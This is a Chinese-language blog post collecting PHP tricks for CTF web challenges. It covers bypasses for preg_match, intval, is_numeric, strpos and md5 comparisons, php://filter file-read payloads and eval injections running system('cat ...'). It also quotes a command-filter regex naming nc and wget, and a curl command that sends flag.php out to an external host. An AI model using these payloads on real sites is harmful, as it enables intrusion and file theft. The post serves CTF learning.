<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>sx-zhang</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="sx-zhang"><meta name="msapplication-TileImage" content="/img/mylogo.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="sx-zhang"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="摘要：本文总结了ctf中涉及php的tricks"><meta property="og:type" content="blog"><meta property="og:title" content="sx-zhang"><meta property="og:url" content="https://sx-zhang.top/2022/05/29/web/PHP%E7%9A%84tricks/"><meta property="og:site_name" content="sx-zhang"><meta property="og:description" content="摘要：本文总结了ctf中涉及php的tricks"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://s2.loli.net/2022/05/30/My7EKucwznBFSkW.png"><meta property="og:image" content="https://s2.loli.net/2022/05/30/Po8u6qYBcOIQasM.png"><meta property="og:image" content="https://s2.loli.net/2022/05/30/m8KGvD1UWVBpZe6.png"><meta property="og:image" content="https://s2.loli.net/2022/06/02/zeHhvOYNqZlS7r9.png"><meta property="article:published_time" content="2022-05-29T08:58:50.000Z"><meta property="article:modified_time" content="2022-06-02T04:20:48.409Z"><meta property="article:author" content="Shixuan Zhang"><meta property="article:tag" content="php"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://s2.loli.net/2022/05/30/My7EKucwznBFSkW.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://sx-zhang.top/2022/05/29/web/PHP%E7%9A%84tricks/"},"headline":"sx-zhang","image":["https://s2.loli.net/2022/05/30/My7EKucwznBFSkW.png","https://s2.loli.net/2022/05/30/Po8u6qYBcOIQasM.png","https://s2.loli.net/2022/05/30/m8KGvD1UWVBpZe6.png","https://s2.loli.net/2022/06/02/zeHhvOYNqZlS7r9.png"],"datePublished":"2022-05-29T08:58:50.000Z","dateModified":"2022-06-02T04:20:48.409Z","author":{"@type":"Person","name":"Shixuan Zhang"},"publisher":{"@type":"Organization","name":"sx-zhang","logo":{"@type":"ImageObject","url":"https://sx-zhang.top/img/mylogo.jpg"}},"description":"摘要：本文总结了ctf中涉及php的tricks"}</script><link rel="canonical" href="https://sx-zhang.top/2022/05/29/web/PHP%E7%9A%84tricks/"><link rel="icon" href="/img/mylogo.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Oxanium:wght@300;400;600&amp;family=Roboto+Mono"><link rel="stylesheet" href="/css/cyberpunk.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.1.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/mylogo.jpg" alt="sx-zhang" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">主页</a><a class="navbar-item" href="/archives">文章</a><a class="navbar-item" href="/categories">目录</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/zhangsx19"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-05-29T08:58:50.000Z" title="2022/5/29 16:58:50">2022-05-29</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-06-02T04:20:48.409Z" title="2022/6/2 12:20:48">2022-06-02</time></span><span class="level-item"><a class="link-muted" href="/categories/security/">security</a></span><span class="level-item">17 minutes read (About 2575 words)</span></div></div><div class="content"><p><strong>摘要：本文总结了ctf中涉及php的tricks</strong></p>
<span id="more"></span>
<hr>
<h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h1><p><a target="_blank" rel="noopener" href="http://www.javashuo.com/article/p-cwpcukmt-ek.html">kali</a></p>
<h1 id="一-伪随机数"><a href="#一-伪随机数" class="headerlink" title="一.伪随机数"></a>一.伪随机数</h1><p>mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数。<br>提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数。并且如果设置了 seed参数 生成的随机数就是伪随机数，即每次生成的随机数是一样的<br>mt_rand()的值与<code>调用次数、操作系统、php版本(浏览器插件查看)</code>有关<br>若不知道seed，可用<a target="_blank" rel="noopener" href="https://www.openwall.com/php_mt_seed/">工具</a>或自己遍历种子与随机数比较</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在linux下面make之后运行脚本添加随机数 time ./php_mt_seed 183607393 <span class="comment">#一定加time否则很慢</span></span><br><span class="line">或 time ./php_mt_seed 1328851649 1328851649 0 2147483647 1423851145 <span class="comment">#第一次范围，第二次缺省，第三次调用输出的随机数为1423851145</span></span><br></pre></td></tr></table></figure>
<h1 id="二、函数"><a href="#二、函数" class="headerlink" title="二、函数"></a>二、函数</h1><h2 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h2><p>1.如果第二个参数是 0，通过检测 var 的格式来决定使用的进制：<br>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，如果字符串以 “0” 开始，使用 8 进制(octal)；否则，使用 10 进制 (decimal)。注意数字前可以加’+’<br>2.intval() 不能用于 object和数组，否则会产生 E_NOTICE 错误并返回 1（通常配合preg_match来使用）<br>3.小数舍去</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">intval</span>(<span class="string">&#x27;1e1000&#x27;</span>)=<span class="number">1</span> <span class="comment">//英文字母后的数字都省略</span></span><br><span class="line"><span class="title function_ invoke__">intval</span>(<span class="number">665.999999</span>)==<span class="number">665</span> <span class="comment">//而665.9999999==666成立</span></span><br><span class="line"><span class="title function_ invoke__">intval</span>(<span class="keyword">array</span>())=<span class="number">0</span>,<span class="title function_ invoke__">intval</span>(<span class="keyword">array</span>(<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>))=<span class="number">1</span>,<span class="title function_ invoke__">intval</span>(<span class="keyword">array</span>(<span class="string">&#x27;aa&#x27;</span>,<span class="string">&#x27;bb&#x27;</span>,<span class="string">&#x27;cc&#x27;</span>))=<span class="number">1</span> <span class="comment">//非空的数组会返回1,注意在url输入[]来表示数组，array会被认作字符串</span></span><br><span class="line"><span class="title function_ invoke__">intval</span>(<span class="string">&#x27;0x3A&#x27;</span>)=<span class="number">0</span>,<span class="title function_ invoke__">intval</span>(<span class="number">0x3A</span>)=<span class="number">58</span>,<span class="title function_ invoke__">intval</span>(<span class="string">&#x27;0x3A&#x27;</span>,<span class="number">0</span>)=<span class="number">58</span> <span class="comment">//十六进制,八进制开头是0</span></span><br></pre></td></tr></table></figure>
<h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h2><p>返回的匹配次数，不匹配为0，匹配成功1次即为1，然后停止搜索<br>preg_match_all()不同于此，它会一直搜索直到到达结尾</p>
<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>\056\160\150\x70为16进制和8进制ascii代码<br>“\|”就是表示”|”<br>|属于正则中的元字符，表示或的意思，因此表示’|’字符本身必须转义<br>\本身具有转义作用，\表示\ ,’\|’传给正则就是”|“,表示对|进行转义，不作为特殊字符使用</p>
<h3 id="绕过方法："><a href="#绕过方法：" class="headerlink" title="绕过方法："></a>绕过方法：</h3><p>1.数组绕过，如果发生错误(比如传进参数是数组),两者返回 FALSE。常配合file_put_contents的数组漏洞使用<br><img src="https://s2.loli.net/2022/05/30/My7EKucwznBFSkW.png" alt="20220530161635"><br>2.多行匹配&#x2F;m<br>看到&#x2F;i可想到%0a绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/^AB/会匹配<span class="string">&quot;ABn e&quot;</span>中的A，但是不会匹配<span class="string">&quot;ab AB&quot;</span>中的A <span class="comment">//匹配开始行</span></span><br><span class="line">[^a-zA-Z0-<span class="number">9</span>]表示“找到一个非字母也非数字的字符”。 <span class="comment">//取否</span></span><br><span class="line"></span><br><span class="line">/i <span class="comment">//忽略大小写</span></span><br><span class="line">/g <span class="comment">//全文查找出现的所有匹配字符</span></span><br><span class="line">/m <span class="comment">//多行查找,可通过%0a绕过,详细参见https://wenku.baidu.com/view/a897bc29f22d2af90242a8956bec0975f465a4c0.html</span></span><br><span class="line"></span><br><span class="line">^php <span class="comment">//开头匹配 如phpaaa</span></span><br><span class="line">php$ <span class="comment">//结尾匹配 如aaaphp</span></span><br><span class="line">^php$ <span class="comment">//只有php能匹配</span></span><br></pre></td></tr></table></figure>
<p>3.长度溢出</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;very&#x27;</span>, <span class="string">&#x27;250000&#x27;</span>).<span class="string">&#x27;36Dctfshow&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h2><p>绕过：ereg()函数存在NULL截断漏洞，当传入的字符串包含%00时，只有%00前的字符串会传入函数并执行，而后半部分不会传入函数判断。因此可以使用%00截断，连接非法字符串，从而绕过函数</p>
<h2 id="highlight-file"><a href="#highlight-file" class="headerlink" title="highlight_file"></a>highlight_file</h2><p>用绝对路径和相对路径..&#x2F;和.&#x2F;绕过，得到文件包含<br><code>$_SERVER</code>参数会自动加上HTTP_<br>文件上传时可以用show_source(<strong>FILE</strong>);看上传成功没有</p>
<h2 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents"></a>file_put_contents</h2><p>看file_put_contens的文档即可发现，函数第二个允许传入数组，将被连接为字符串再写入<br><img src="https://s2.loli.net/2022/05/30/Po8u6qYBcOIQasM.png" alt="20220530162849"></p>
<h2 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">in_array</span> ( 要在数组搜索的值 , 要搜索的数组, <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">FALSE</span>) <span class="comment">//漏洞在于第三个参数可选，如不设置为true就不检测类型，是弱比较，相当于==号，如&quot;1.php&quot;==1</span></span><br></pre></td></tr></table></figure>
<h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric"></a>is_numeric</h2><p>非数值-&gt;数值：<br>1.可以将非数值字符串转换为16进制再进行判断</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span> -&gt; <span class="number">0x31206f722031</span></span><br><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="string">&quot;0x123&quot;</span>);<span class="comment">//php7以后为false,以前为true</span></span><br></pre></td></tr></table></figure>
<p>2.在数字前加上空格，也会被is_numeric函数认为是数字</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">0</span>c=&gt;\f</span><br><span class="line">trim函数会过滤空格以及\n\r\t\v\<span class="number">0</span>，但不会过滤\f</span><br><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="string">&quot;%0c36&quot;</span>) <span class="comment">//true</span></span><br></pre></td></tr></table></figure>
<p>数值-&gt;非数值的绕过:<br>可以借助url编码中的空字符，例如%00或者%20，其中%00加在数值前面或者后面都可以；%20加在数值末尾也可以绕过</p>
<h2 id="is-file"><a href="#is-file" class="headerlink" title="is_file"></a>is_file</h2><p>绕过：利用函数所能处理的长度限制进行目录溢出。从而让is_file认为不是一个文件</p>
<h2 id="call-user-func-函数，参数"><a href="#call-user-func-函数，参数" class="headerlink" title="call_user_func(函数，参数)"></a>call_user_func(函数，参数)</h2><p>可调用此文件定义好的函数(默认有hex2bin,bin2hex等字符串和16进制转换可用)</p>
<h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str"></a>parse_str</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="string">&quot;name=Peter&amp;age=43&quot;</span>,<span class="variable">$myArray</span>);<span class="comment">//Array ( [name] =&gt; Peter [age] =&gt; 43 )</span></span><br></pre></td></tr></table></figure>
<h2 id="eregi、ereg"><a href="#eregi、ereg" class="headerlink" title="eregi、ereg"></a>eregi、ereg</h2><p>注意在PHP7已废用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">eregi</span>(正则表达式，匹配字符串)<span class="comment">//不区分大小写</span></span><br><span class="line">如<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z0-9]+$&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])限制了password的形式，只能是一个或者多个数字、大小写字母，可以使用%<span class="number">00</span>截断正则匹配。password=<span class="number">1e8</span>%<span class="number">00</span>*-*</span><br><span class="line">如<span class="title function_ invoke__">eregi</span>(<span class="string">&quot;111&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;1114&quot;</span>)可令<span class="variable">$b</span>=.或<span class="variable">$b</span>=%<span class="number">00</span></span><br></pre></td></tr></table></figure>

<h1 id="三、字符串"><a href="#三、字符串" class="headerlink" title="三、字符串"></a>三、字符串</h1><h2 id="strpos"><a href="#strpos" class="headerlink" title="strpos"></a>strpos</h2><p>strpos() 函数是区分大小写的。<br>返回字符串在另一个字符串中第一次出现的位置。如果没有找到该字符串，则返回 false<br>绕过方法：1.利用换行（%0a）或+(%2b,如果是数字)进行绕过<br><code>if(!strpos($num, &quot;0&quot;))</code><br>2.大小写<br>3.目录穿越</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br><span class="line">/ctfshow/../../../../<span class="keyword">var</span>/www/html/flag.php </span><br></pre></td></tr></table></figure>
<h2 id="str-replace"><a href="#str-replace" class="headerlink" title="str_replace"></a>str_replace</h2><p>用于替换字符串中指定字符（区分大小写）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str_replace(要查找的值,替换的值,被搜索的字符串,可选count)</span><br></pre></td></tr></table></figure>
<p>绕过：str_replace无法迭代过滤 ，可以通过双写绕过</p>
<h2 id="strtr"><a href="#strtr" class="headerlink" title="strtr"></a>strtr</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">strtr</span>(<span class="keyword">string</span>,<span class="keyword">from</span>,to)</span><br><span class="line"><span class="title function_ invoke__">strtr</span>(<span class="keyword">string</span>,<span class="keyword">array</span>)</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&quot;Hello&quot;</span> =&gt; <span class="string">&quot;Hi&quot;</span>, <span class="string">&quot;world&quot;</span> =&gt; <span class="string">&quot;earth&quot;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h2><p>PHP接收参数时，发现表单名中如果是 句号(.)或者空格( )，会被转换成下划线(_)<br>解决方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A[W.C <span class="comment">//A_W.C</span></span><br></pre></td></tr></table></figure>

<h1 id="四、md5、sha1"><a href="#四、md5、sha1" class="headerlink" title="四、md5、sha1"></a>四、md5、sha1</h1><h2 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>) == </span><br><span class="line"><span class="string">&#x27;0e830400451993494058024219903391&#x27;</span></span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="string">&#x27;240610708&#x27;</span>) == </span><br><span class="line"><span class="string">&#x27;0e462097431906509019562988736854&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="x3D-x3D-x3D-数组碰撞"><a href="#x3D-x3D-x3D-数组碰撞" class="headerlink" title="&#x3D;&#x3D;&#x3D;数组碰撞"></a>&#x3D;&#x3D;&#x3D;数组碰撞</h2><p>md5传入数组会返回NULL<br>[1] !&#x3D;&#x3D; [2] &amp;&amp; md5([1]) &#x3D;&#x3D;&#x3D; md5([2])</p>
<h1 id="五、运算符优先级"><a href="#五、运算符优先级" class="headerlink" title="五、运算符优先级"></a>五、运算符优先级</h1><h2 id="and"><a href="#and" class="headerlink" title="and"></a>and</h2><p>AND运算符和&amp;&amp;运算符的根本区别在于它们的优先级差异，但两者都执行相同的操作。<br>第一个表达式，<code>$bool = TRUE &amp;&amp; FALSE</code>; 计算结果为FALSE，因为执行了第一个&amp;&amp;操作，然后将结果赋值给变量<code>$bool</code>，因为&amp;&amp;运算符的优先级高于&#x3D;的优先级。<br>第二个表达式，<code>$bool = TRUE and FALSE</code>; 计算结果为TRUE，因为运算符”and”的优先级低于运算符”&#x3D;”，因此&#x3D;的右边的值TRUE被分配给<code>$bool</code>，然后”and”操作在内部执行但未分配，因此<code>$bool</code>现在保持为TRUE。</p>
<h2 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp; ||"></a>&amp;&amp; ||</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A &amp;&amp; B || C <span class="comment">//可不管A,B,只保证C为true</span></span><br></pre></td></tr></table></figure>

<h1 id="六、内置类"><a href="#六、内置类" class="headerlink" title="六、内置类"></a>六、内置类</h1><p>1.反射类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"><span class="comment">// v1=ReflectionClass&amp;v2=system(&#x27;cat fl36dg.txt&#x27;)</span></span><br><span class="line"><span class="comment">//当新建ReflectionClass类并传入PHP代码时，会返回代码的运行结果，可以通过echo显示。即使传入了空的括号，代码依旧可以运行</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;class&#x27;</span>);<span class="comment">//返回类信息</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="title class_">ReflectionObject</span>(<span class="variable">$student</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(getcwd);<span class="comment">//Function [ function getcwd ] &#123; - Parameters [0] &#123; &#125; &#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>2.Exception类<br>3.FilesystemIterator类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$iterator</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&#x27;.&#x27;</span>); <span class="comment">// 创建当前目录的迭代器,默认只显示第一个文件,需要遍历</span></span><br><span class="line"><span class="title function_ invoke__">getcwd</span>()<span class="comment">//获取当前工作目录</span></span><br></pre></td></tr></table></figure>

<h1 id="七、伪协议"><a href="#七、伪协议" class="headerlink" title="七、伪协议"></a>七、伪协议</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);<span class="comment">//php://input读取post的data的内容作为文件</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=/flag</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);<span class="comment">//$str进行base64编码</span></span><br><span class="line"><span class="variable">$v3</span>=php:<span class="comment">//filter/write=convert.base64-decode/resource=1.php</span></span><br><span class="line">若base64在黑名单，可绕过：</span><br><span class="line">php:<span class="comment">//filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.quoted-printable-encode/resource=flag.php</span></span><br><span class="line">若php:<span class="comment">//在黑名单：</span></span><br><span class="line">compress.zlib:<span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/05/30/m8KGvD1UWVBpZe6.png" alt="20220530222004"></p>
<h1 id="八、全局变量"><a href="#八、全局变量" class="headerlink" title="八、全局变量"></a>八、全局变量</h1><p>flag In the variable </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$args</span>);&quot;</span>);<span class="comment">//?args=GLOBALS</span></span><br></pre></td></tr></table></figure>
<p>_()&#x3D;&#x3D;gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(_,<span class="string">&quot;get_defined_vars&quot;</span>));</span><br><span class="line"><span class="title function_ invoke__">_</span>(<span class="string">&quot;get_defined_vars&quot;</span>)=get_defined_vars</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(get_defined_vars)</span><br></pre></td></tr></table></figure>

<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="题目给了eval-quot-c-quot"><a href="#题目给了eval-quot-c-quot" class="headerlink" title="题目给了eval(&quot;$c&quot;)"></a>题目给了<code>eval(&quot;$c&quot;)</code></h2><p>构造<code>$c</code>的方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="keyword">echo</span>/var_dump/<span class="keyword">print</span> <span class="variable">$flag</span>/GLOBALS;</span><br><span class="line"><span class="number">2</span>.highlight_file/<span class="title function_ invoke__">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]</span><br><span class="line">GET:?a=<span class="number">1</span>+fl0g=flag_give_me</span><br><span class="line">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="title function_ invoke__">parse_str</span>(<span class="variable">$a</span>[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">GET:?<span class="variable">$fl0g</span>=flag_give_me</span><br><span class="line">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="title function_ invoke__">assert</span>(<span class="variable">$a</span>[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];<span class="comment">//url的?后的所有内容</span></span><br></pre></td></tr></table></figure>

<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?F=`<span class="variable">$F</span>`;空格sleep <span class="number">3</span><span class="comment">//好像网站确实sleep了一会说明的确执行了命令</span></span><br><span class="line">``是<span class="title function_ invoke__">shell_exec</span>()函数的缩写</span><br><span class="line">先进行<span class="title function_ invoke__">substr</span>()函数截断然后去执行<span class="keyword">eval</span>()函数,即<span class="keyword">eval</span>(<span class="string">&quot;`<span class="subst">$F</span>`;空格&quot;</span>)</span><br><span class="line">而<span class="variable">$F</span>就是我们输入的`<span class="variable">$F</span>`;空格sleep <span class="number">3</span></span><br><span class="line">即最终效果是<span class="keyword">eval</span>(`sleep <span class="number">3</span>`);<span class="comment">//注意sleep 3是shell命令，不会在网站显示，所以需要OOB</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?F=`<span class="variable">$F</span>`;+curl -X POST -F xx=@flag.php  http:<span class="comment">//生成的域名</span></span><br><span class="line"><span class="comment">//xx是上传文件的name值，可随便写。flag.php就是上传的文件,前面要加@表示是文件 </span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/06/02/zeHhvOYNqZlS7r9.png" alt="20220602121923"></p>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>一句话木马：</p>
